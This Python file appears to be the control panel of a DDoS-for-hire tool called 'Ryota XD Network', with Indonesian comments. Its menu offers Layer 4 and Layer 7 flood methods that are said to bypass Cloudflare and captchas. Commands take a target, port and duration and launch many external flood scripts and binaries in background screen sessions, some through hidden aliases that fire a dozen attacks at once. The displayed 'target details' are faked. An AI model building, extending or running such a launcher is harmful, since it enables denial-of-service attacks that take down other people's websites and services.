from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
from colorama import Fore, Back
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

B = '\033[35m' #MERAH
P = '\033[1;37m' #PUTIH


# Fungsi untuk mendapatkan waktu saat ini dalam format yang diinginkan
from datetime import datetime

def waktu():
    # Mendapatkan waktu saat ini dalam format yang diinginkan
    return datetime.now().strftime("%b %d %Y %H:%M:%S")


# Daftar negara
countries = ['Indonesia', 'Amerika Serikat', 'Inggris', 'Perancis', 'Jepang', 'Kanada', 'Australia', 'Germany', 'Malaysia', 'Russia', 'China']

# Memilih negara secara acak
random_country = random.choice(countries)


B = '\033[35m' #MERAH
P = '\033[1;37m' #PUTIH

def country():
    # Membuat daftar negara dan singkatannya
    countries = {
        "United States": "US",
        "United Kingdom": "UK",
        "Canada": "CA",
        "Australia": "AU",
        "Indonesia": "INA",
        # Tambahkan negara lain di sini sesuai kebutuhan
    }

def VIP():
        print("""
\033[32m                              Layer 7 Vip
\033[31m=============================             =============================
\033[37m  TLS          \033[35m    - Layer 7 - \033[36mBypass HTTPDDOS
\033[37m  TLSV2        \033[35m    - Layer 7 - \033[36mAuto Browser, High Rps
\033[37m  MIX          \033[35m    - Layer 7 - \033[36mCloudFlare, Good for CloudFlare
\033[37m  HTTPS2       \033[35m    - Layer 7 - \033[36mBypass Chaptcha, good for Hold
\033[37m  FLOOD        \033[35m    - Layer 7 - \033[36mBIG RPS, No HTTPDDOS
\033[31m=======================================================================

\033[32m                              Layer 4 Vip
\033[31m=============================             =============================
\033[37m  TCP          \033[35m    - Layer 4 - \033[36mTCP VIP
\033[31m=======================================================================

\033[35m Command :\033[37m [METHOD] [TARGET] [PORT] [TIME]
""")

def plan():
        print("""
\033[35m	   ╚╦═══════════════════════════════════════════╦╝
\033[35m       ╔════╩═══════════════════════════════════════════╩════╗
\033[35m       ║                \033[36m  look at your plan\033[35m                  ║
\033[35m       ╚═════════════════════════════════════════════════════╝
\033[35m          ╔═══════════════════════════════════════════════╗
\033[35m          ║  \033[37mUser : [\033[32m root\033[37m ]      |\033[37m  all access [\033[32m yes\033[37m ]\033[35m   ║
\033[35m          ║  \033[37mMax Time : [\033[32m 300\033[37m ]   |\033[37m  blocked [\033[31m no\033[37m ]\033[35m       ║
\033[35m          ║  \033[37mAdmin : [\033[32m true\033[37m ]     |\033[37m  online [\033[32m 3/5 \033[37m]\033[35m       ║
\033[35m          ║  \033[37mvip : [\033[32m true\033[37m ]       |\033[35m                       ║
\033[35m          ║  \033[37mExpiry : [\033[32m 9529\033[37m ]    |\033[35m                       ║
\033[35m          ╚═══════════════════════════════════════════════╝
""")


def methods():
        print("""
Coming Soon
""")

def menu():
    os.system ("clear")
    print("""
\033[32m  [\033[37m Ryota XD\033[32m ] [\033[37m Welcome To Ryota XD Network \033[32m] [\033[37m Owner : Ryota XD \033[32m]

\033[35m       ╔════╩═══════════════════════════════════════════╩════╗
\033[35m       ║             WELCOME TO RYOTA XD NETWORK🔥           ║
\033[35m       ║             • Ryota XD & Bill & Cikoo •             ║
\033[35m       ╚═════════════════════════════════════════════════════╝

\033[35m          ╔═══════════════════════════════════════════════╗
\033[35m          ║-➤\033[36m Methods |\033[37m see methods\033[35m                       ║
\033[35m          ║-➤\033[36m Vip     |\033[37m see all vip methods\033[35m               ║
\033[35m          ║-➤\033[36m Plan    |\033[37m View your plan\033[35m                    ║
\033[35m          ╚═══════════════════════════════════════════════╝
""")


def main():

	while True:
		sys.stdout.write(f"\x1b]2;[-] RYOTA-XD NETWORK :: Server Online :: Server Private ::\x07")
		sin = input("• Ryota XD - NETWORK • : ")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			menu()
		if sinput == "cls" or sinput == "CLS":
			os.system ("pkill screen")
			os.system ("clear")
			menu()
		if sinput == "stop" or sinput == "STOP":
			os.system ("pkill screen")
			menu()			
		if sinput == "vip" or sinput == "vip" or sinput == ".vip" or sinput == "VIP" or sinput == ".VIP" or sinput == "VIP":
			VIP()
		if sinput == "methods" or sinput == "methods" or sinput == ".methods" or sinput == "METHODS" or sinput == ".METHODS" or sinput == "METHODS":
			methods()
		if sinput == "plan":
			plan()
		elif sinput == "":
			main()

#########LAYER-4########
		elif sinput == "tls" or sinput == "TLS":
			try:
				url = sin.split()[1]
				port = sin.split()[3]
				time = sin.split()[2]
				os.system(f'screen -dm node tls.js {url} {port} {time} 14')
				print(f"""
\033[1;37m Attacks Details
\033[1;37m   Status:      \033[37m[\033[36m Attack Sent Successfully All Server\033[37m ]
\033[1;37m   Host:        \033[37m[ \033[36m{url} \033[37m]
\033[1;37m   Port:        \033[37m[\033[36m {time}\033[37m ]
\033[1;37m   Time:        \033[37m[\033[36m {port}\033[37m ]
\033[1;37m   Method:      \033[37m[\033[36m tls\033[37m ]
\033[1;37m   Start Attack:\033[37m[\033[36m {waktu()} \033[37m]

\033[1;37m Target Details
\033[1;37m   ASN:        \033[37m [ \033[36mAS13335 Cloudflare, Inc.\033[37m ]
\033[1;37m   ISP:        \033[37m [ \033[36mAS13335\033[37m ]
\033[1;37m   ORG:        \033[37m [ \033[36m{random_country}\033[37m ]

\033[37mPlease After Attack Type \033[34m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tlsv2" or sinput == "TLSV2":
			try:
				url = sin.split()[1]
				port = sin.split()[3]
				time = sin.split()[2]
				os.system(f'screen -dm node TLS-V2.js {url} {port} {time} 14')
				print(f"""
\033[1;37m Attacks Details
\033[1;37m   Status:      \033[37m[\033[32m Attack Sent Successfully All Server\033[37m ]
\033[1;37m   Host:        \033[37m[ \033[36m{url} \033[37m]
\033[1;37m   Port:        \033[37m[\033[36m {time}\033[37m ]
\033[1;37m   Time:        \033[37m[\033[36m {port}\033[37m ]
\033[1;37m   Method:      \033[37m[\033[36m tlsv2\033[37m ]
\033[1;37m   Start Attack:\033[37m[\033[36m {waktu()} \033[37m]

\033[1;37m Target Details
\033[1;37m   ASN:        \033[37m [ \033[36mAS13335 Cloudflare, Inc.\033[37m ]
\033[1;37m   ISP:        \033[37m [ \033[36mAS13335\033[37m ]
\033[1;37m   ORG:        \033[37m [ \033[36m{random_country}\033[37m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "mix" or sinput == "MIX":
			try:
				url = sin.split()[1]
				port = sin.split()[3]
				time = sin.split()[2]
				os.system(f'screen -dm node MIX.js {url} {port} {time} 14')
				print(f"""
\033[1;37m Attacks Details
\033[1;37m   Status:      \033[37m[\033[32m Attack Sent Successfully All Server\033[37m ]
\033[1;37m   Host:        \033[37m[ \033[36m{url} \033[37m]
\033[1;37m   Port:        \033[37m[\033[36m {time}\033[37m ]
\033[1;37m   Time:        \033[37m[\033[36m {port}\033[37m ]
\033[1;37m   Method:      \033[37m[\033[36m mix\033[37m ]
\033[1;37m   Start Attack:\033[37m[\033[36m {waktu()} \033[37m]

\033[1;37m Target Details
\033[1;37m   ASN:        \033[37m [ \033[36mAS13335 Cloudflare, Inc.\033[37m ]
\033[1;37m   ISP:        \033[37m [ \033[36mAS13335\033[37m ]
\033[1;37m   ORG:        \033[37m [ \033[36m{random_country}\033[37m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()

#########LAYER-7########  
		elif sinput == "https2" or sinput == "HTTPS2":
			try:
				url = sin.split()[1]
				port = sin.split()[3]
				time = sin.split()[2]
				os.system(f'screen -dm node HTTPS2.js {url} {port} {time} 14 proxy.txt')
				print(f"""
\033[1;37m Attacks Details
\033[1;37m   Status:    \033[37m[\033[32m Attack Sent Successfully All Server\033[37m ]
\033[1;37m   Host:      \033[37m[ \033[36m{url} \033[37m]
\033[1;37m   Port:      \033[37m[\033[36m {time}\033[37m ]
\033[1;37m   Time:      \033[37m[\033[36m {port}\033[37m ]
\033[1;37m   Method:    \033[37m[\033[36m https2\033[37m ]
\033[1;37m   Start Attack:\033[37m[\033[36m {waktu()} \033[37m]

\033[1;37m Target Details
\033[1;37m   ASN:        \033[37m [ \033[36mAS13335 Cloudflare, Inc.\033[37m ]
\033[1;37m   ISP:        \033[37m [ \033[36mAS13335\033[37m ]
\033[1;37m   ORG:        \033[37m [ \033[36m{random_country}\033[37m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "flood" or sinput == "FLOOD":
			try:
				url = sin.split()[1]
				port = sin.split()[3]
				time = sin.split()[2]
				os.system(f'screen -dm node flood.js {url} {port} {time} 14')
				print(f"""
\033[1;37m Attacks Details
\033[1;37m   Status:    \033[37m[\033[32m Attack Sent Successfully All Server\033[37m ]
\033[1;37m   Host:        \033[37m[ \033[36m{url} \033[37m]
\033[1;37m   Port:      \033[37m[\033[36m {time}\033[37m ]
\033[1;37m   Time:      \033[37m[\033[36m {port}\033[37m ]
\033[1;37m   Method:    \033[37m[\033[36m flood\033[37m ]
\033[1;37m   Start Attack:\033[37m[\033[36m {waktu()} \033[37m]

\033[1;37m Target Details
\033[1;37m   ASN:        \033[37m [ \033[36mAS13335 Cloudflare, Inc.\033[37m ]
\033[1;37m   ISP:        \033[37m [ \033[36mAS13335\033[37m ]
\033[1;37m   ORG:        \033[37m [ \033[36m{random_country}\033[37m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tcp" or sinput == "TCP":
			try:
				ip = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'screen -dm node TCP-KILL.js {ip} {port} {time} ')
				print(f"""
\033[1;37m Attacks Details
\033[1;37m   Status:      \033[37m[\033[32m Attack Sent Successfully All Server\033[37m ]
\033[1;37m   Host:        \033[37m[ \033[36m{ip} \033[37m]
\033[1;37m   Port:        \033[37m[\033[36m {port}\033[37m ]
\033[1;37m   Time:        \033[37m[\033[36m {time}\033[37m ]
\033[1;37m   Method:      \033[37m[\033[36m tcp\033[37m ]
\033[1;37m   Start Attack:\033[37m[\033[36m {waktu()} \033[37m]

\033[1;37m Target Details
\033[1;37m   ASN:        \033[37m [ \033[36mAS13335 Cloudflare, Inc.\033[37m ]
\033[1;37m   ISP:        \033[37m [ \033[36mAS13335\033[37m ]
\033[1;37m   ORG:        \033[37m [ \033[36m{random_country}\033[37m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "rurjrjrjrj" or sinput == "osejjerjjrj":
			try:
				host = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd .resources && screen -dm node count.js {host} 40 {time}')
				os.system(f'cd .bot && screen -dm node count.js {host} 40 {time}')
				os.system(f'cd .bot && screen -dm python3 input.py {host} {time}')
				os.system(f'cd .randomstring && screen -dm python3 input.py {host} {time}')
				os.system(f'cd /media && screen -dm python3 input.py {host} {time}')
				os.system(f'cd /media && screen -dm node count.js {host} 40 {time}')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   LAYER-12 : \033[35m[ \033[1;37mBOT \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37m \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "rurjjr" or sinput == "rjrjrj":
			try:
				host = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd .randomstring && screen -dm python3 input.py {host} {time}')				
				os.system(f'cd .bot && screen -dm python3 input.py {host} {time}')
				os.system(f'cd .bot && screen -dm node count.js {host} 40 {time}')
				os.system(f'cd .resources && screen -dm node count.js {host} 40 {time}')
				os.system(f'cd /media && screen -dm node count.js {host} 40 {time}')
				os.system(f'cd /media && screen -dm python3 input.py {host} {time}')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   LAYER-12 : \033[35m[ \033[1;37mBRUTAL \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37m \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "t" or sinput == "T":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'screen -dm node tlsv2.js {host} {time} 8 1')
				os.system(f'screen -dm ./tls {host} {time} 32 5 500')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mTLSV2 \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37m \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "jdrjjrjrjrjrj" or sinput == "ieieiejejrjrj":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .worm && screen -dm ./tls-linux {host} {time} 40 3 500')
				os.system(f'cd .wormc && screen -dm ./tls-linux {host} {time} 64 1 500')
				os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 8 500')
				os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
				os.system(f'cd .RATC && screen -dm ./passkey {host} {time} 64 GET proxy.txt 16')
				os.system(f'cd /media && screen -dm ./passkey {host} {time} 32 GET proxy.txt 16')
				os.system(f'cd /media && screen -dm ./tls {host} {time} 300 5 500')
				os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 40 3 500')  
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mTLSV3 \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mrjrjrjrjrjr \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "vrhrjrjrjrj" or sinput == "rjrjrjjrjrjoowb":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .godzilla && screen -dm node HTTP.js {host} 500 5 {time}')
				os.system(f'cd .godzilla && screen -dm node HTTP-RAND.js {host} {time}')
				os.system(f'cd .malware && screen -dm node HTTP-RAND.js {host} {time}')
				os.system(f'cd .malware && screen -dm node HTTP.js {host} 300 8 {time}')
				os.system(f'cd /media && screen -dm node HTTP.js {host} 300 8 {time}')
				os.system(f'cd /media && screen -dm node HTTP-RAND.js {host} {time}')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mHTTP \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mdidjdj \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "rkrkrjrjt" or sinput == "rjrjjrrjj":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'screen -dm go run Hulk.go -site {host} -data POST')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                LAYER-7  : \033[35m[ \033[1;37mBOMB2 \033[35m]
\033[1;37m                VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                USER     : \033[35m[ \033[1;37mrkkrkrk \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "bdhfjfjfj" or sinput == "rkrkrjrkrjjodv":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .resources && screen -dm go run Low.go -site {host} -data POST')
				os.system(f'cd /media && screen -dm go run Low.go -site {host} -data GET')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                LAYER-7  : \033[35m[ \033[1;37mBOMB \033[35m]
\033[1;37m                VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                USER     : \033[35m[ \033[1;37mjtjtjtbtekev \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "vssbdbdb" or sinput == "j4rjrjrjrjb":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .resources && python3 goldeneye.py {host} -w 10 -s 500 -m random -d True')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET    : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                TIME      : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                PORT      : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                LAYER-7   : \033[35m[ \033[1;37mGOLDEN \033[35m]
\033[1;37m                VIP       : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                USER      : \033[35m[ \033[1;37midhdhdb \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "sndmsnd" or sinput == "neejeogeveb":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .randomstring && screen -dm ./screetvip {host} {time} 50 10')
				os.system(f'cd .malware && screen -dm ./tls {host} {time} 8 8 500')		
				os.system(f'cd .wormc && screen -dm ./tls-linux {host} {time} 40 5 128')
				os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 32')
				os.system(f'cd /media && screen -dm ./screetvip {host} {time} 50 10')
				os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 40 5 128')
				os.system(f'cd /media && screen -dm ./tls {host} {time} 8 8 500')	
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                METHOD   : \033[35m[ \033[1;37mHTTPS \033[35m]
\033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
\033[1;37m                USER     : \033[35m[ rjjrjrjrjrjr\033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
			    main()
		elif sinput == "orjr" or sinput == "irir":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 8 500')
				os.system(f'cd .godzilla && screen -dm node tlsv2.js {host} {time} 500 2')
				os.system(f'cd .randomstring && screen -dm ./screetvip {host} {time} 500 5')
				os.system(f'cd .godzilla && screen -dm node HTTP.js {host} 500 1 {time}')
				os.system(f'cd .resources && screen -dm go run Hulk.go -site {host} -data GET')
				os.system(f'cd .godzilla && screen -dm node HTTP-RAND.js {host} {time}')
				os.system(f'cd .resources && screen -dm go run strike.go -url {host} GET')
				os.system(f'cd .resources && screen -dm go run Low.go -site {host} -data POST')
				os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 128')
				os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 128')
				os.system(f'cd /media && screen -dm ./tls {host} {time} 8 8 500')
				os.system(f'cd /media && screen -dm node tlsv2.js {host} {time} 500 2')
				os.system(f'cd /media && screen -dm ./screetvip {host} {time} 500 5')
				os.system(f'cd /media && screen -dm node HTTP.js {host} 500 1 {time}')
				os.system(f'cd /media && screen -dm go run Hulk.go -site {host} -data POST')
				os.system(f'cd /media && screen -dm node HTTP-RAND.js {host} {time}')
				os.system(f'cd /media && screen -dm go run strike.go -url {host} POST')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                METHOD   : \033[35m[ \033[1;37mHTTPS2 \033[35m]
\033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
\033[1;37m                USER     : \033[35m[ \033[1;37mrjj44jj4 \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
			    main()
		elif sinput == "ishdbebrleeo" or sinput == "skejebeoej":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
				os.system(f'cd .RATC && screen -dm ./passkey {host} {time} 100 GET proxy.txt 32')
				os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                METHOD   : \033[35m[ \033[1;37mBYPASS \033[35m]
\033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
\033[1;37m                USER     : \033[35m[ \033[1;37mnrrkrkrnrn \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
			    main()
		elif sinput == "orjrnrnrn" or sinput == "ebenrnrnnr":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd .SUDAN && screen -dm node OVER.js {host} 64 {time}')
				os.system(f'cd .SUDANC && screen -dm node OVER4.js {host} {time} 10 GET proxy.txt 64')
				os.system(f'cd .SUDAN && screen -dm node OVER2.js {host} {time} 10 proxy.txt 64 10')
				os.system(f'cd .SUDANC && screen -dm node OVER5.js {host} {time} 8 1 proxy.txt')
